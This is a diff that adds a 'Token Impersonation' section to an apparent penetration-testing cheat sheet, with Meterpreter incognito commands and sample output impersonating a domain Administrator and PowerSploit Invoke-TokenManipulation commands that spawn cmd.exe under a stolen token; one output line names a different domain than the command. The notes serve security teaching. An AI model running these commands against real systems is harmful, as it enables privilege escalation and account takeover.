@@ -103,3 +103,45 @@ smb: \> lcd '/path/to/go/'
 smb: \> mget *
 ```
 ---
+
+## Token Impersonation
+
+Tokens include privileges and identity of a user, they act similar to how cookies work for websites. Tokens are present to allow us to use the system without providing credentials at every action. 
+
+If any user logs in, tokens are saved in the machines and if an attacker gets hold of those tokens, we can impersonate the user and execute commands on behalf of them.
+
+**Metasploit**
+
+```bash
+# Using metasploit for token impersonation
+
+meterpreter > use incognito
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+PC1-DCORP\Administrator
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\ANONYMOUS LOGON
+
+meterpreter > impersonate_token PC1-DCORP\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user SNEAKS.IN\Administrator
+
+meterpreter > getuid
+Server username: PC1-DCORP\Administrator
+```
+**PowerSploit**
+```powershell
+# Using PowerSploit module (Invoke-TokenManipulation)
+
+Invoke-TokenManipulation -ImpersonateUser -Username "PC1-DCORP"
+
+# Spawning a process or executing commands
+Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
+```
